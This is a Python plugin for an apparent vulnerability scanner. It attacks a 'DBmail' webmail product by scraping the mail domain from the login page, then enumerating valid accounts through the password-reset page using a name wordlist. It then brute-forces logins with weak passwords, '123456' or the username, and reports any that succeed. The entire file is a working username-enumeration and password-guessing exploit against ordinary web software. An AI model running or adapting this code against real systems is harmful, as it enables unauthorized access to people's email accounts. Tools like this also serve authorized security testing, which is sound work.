#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

import re
import copy
import hashlib
from module.plugin import Plugin

class poc(Plugin):

    type = 'CMS'
    cmsname = 'dbmail'
    querytype = 'site'
    description = 'DBmail Violence crack weak password'
    
    def __init__(self):
        
        self.domain = None
        self.username = list()
        self.check_user_path = '/passwordreset.asp'
        self.check_user_data = {'fm_strLanguage':'chinesegb.asp','fm_strAccount':'{username}@{domain}'}
        self.check_pass_path = '/login.asp'
        self.check_pass_data = {'fm_strAccPrefix':'{username}', 'fm_strDomain':'{domain}', 'fm_strPassword':'{password}', 'fm_strLanguage':'english.asp'}
    
    def exploit(self, target):

        response = self.query(method='GET', url=target)
        if response:
            if response.ok:
                r = re.search('<option value=\'.*?\' selected>(.*?)</option>', response.content)
                if r:
                    self.domain  = r.group(1)
                    self.log.info('Find @domain: '+self.domain)

        if self.domain == None:
            self.log.error('Can\'t Get @domain')
            return False
        
        for name in self.__get_user_name():
            data = copy.copy(self.check_user_data)
            data['fm_strAccount'] = self.check_user_data['fm_strAccount'].format(username=name, domain=self.domain)
            response = self.query(method='POST', url=target+self.check_user_path, data=data)
            if response:
                if response.ok:
                    #self.log.debug(response.content)
                    if '<font color=blue></font>' not in response.content or 'name=fm_strQuestion value=' in response.content:
                        self.log.info('Get UserName: '+name+'@'+self.domain)
                        self.username.append(name)

        if len(self.username) == 0:
            self.log.error('Can\'t Find UserName')
            return False

        for name in self.username:
            for password in ['123456', name]:#self.__get_user_pass(name):
                data = copy.copy(self.check_pass_data)
                data['fm_strAccPrefix'] = self.check_pass_data['fm_strAccPrefix'].format(username=name)
                data['fm_strDomain'] = self.check_pass_data['fm_strDomain'].format(domain=self.domain)
                data['fm_strPassword'] = self.check_pass_data['fm_strPassword'].format(password=hashlib.md5(password).hexdigest())
                response = self.query(method='POST', url=target+self.check_pass_path, data=data, allow_redirects=False)
                if response:
                    if response.ok:
                        if 'fmain.asp' in response.content:
                            self.log.debug(str(data))
                            self.log.vuln('Weak PassWord: '+name+'/'+password)
                            break

    def __get_user_name(self):
        
        name_list = list()
        try:
            f =  open('data/name.txt', 'r')
            for name in f.readlines():
                name_list.append(name.strip('\r\n'))
        except IOError as e:
            self.log.error(str(e))
            return None
        except Exception as e:
            self.log.error(str(e))
            return None

        return name_list


    def __get_user_pass(self, username):
        
        pass_list = list()
        try:
            f =  open('data/pass.txt', 'r')
            for name in f.readlines():
                pass_list.append(name.strip('\r\n'))
            pass_list.append(username)
        except IOError as e:
            self.log.error(str(e))
            return None
        except Exception as e:
            self.log.error(str(e))
            return None

        return pass_list




